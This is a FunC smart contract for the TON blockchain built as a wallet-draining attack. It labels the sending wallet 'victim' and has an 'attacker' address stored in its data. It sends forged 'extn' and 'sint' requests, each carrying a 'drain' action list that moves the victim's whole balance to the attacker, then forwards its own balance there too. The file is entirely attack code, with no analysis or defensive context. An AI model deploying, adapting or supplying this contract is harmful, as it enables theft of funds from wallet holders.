
builder begin_cell() asm "NEWC";
cell end_cell(builder b) asm "ENDC";
builder store_coins(builder b, int x) asm "STVARUINT16";
builder store_slice(builder b, slice s) asm "STSLICER";
builder store_ref(builder b, cell c) asm(c b) "STREF";
slice begin_parse(cell c) asm "CTOS";
(slice, slice) load_msg_addr(slice s) asm( -> 1 0) "LDMSGADDR";
() send_raw_message(cell msg, int mode) impure asm "SENDRAWMSG";
cell get_data() asm "c4 PUSH";

cell message(slice dest, int value, cell body) inline {
  return begin_cell().store_uint(0x18, 6).store_slice(dest).store_coins(value).store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1).store_ref(body).end_cell();
}

() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
  slice cs = in_msg_full.begin_parse();
  int flags = cs~load_uint(4);
  if (flags & 1) { return (); }
  slice victim = cs~load_msg_addr();
  slice attacker = get_data().begin_parse();

  cell drain = begin_cell().store_uint(0x18, 6).store_slice(attacker).store_coins(5000000000).store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1).end_cell();
  cell out_list = begin_cell().store_ref(begin_cell().end_cell()).store_uint(0x0ec3c86d, 32).store_uint(128, 8).store_ref(drain).end_cell();
  cell extn = begin_cell().store_uint(0x6578746e, 32).store_uint(0, 64).store_uint(1, 1).store_ref(out_list).store_uint(0, 1).end_cell();
  send_raw_message(message(victim, 10000000, extn), 1);

  cell sint = begin_cell().store_uint(0x73696e74, 32).store_uint(0, 32).store_uint(0xffffffff, 32).store_uint(0, 32)
    .store_uint(1, 1).store_ref(out_list).store_uint(0, 1).store_uint(0, 256).store_uint(0, 256).end_cell();
  send_raw_message(message(victim, 10000000, sint), 1);

  send_raw_message(message(attacker, 0, begin_cell().store_uint(0, 32).end_cell()), 128);
}
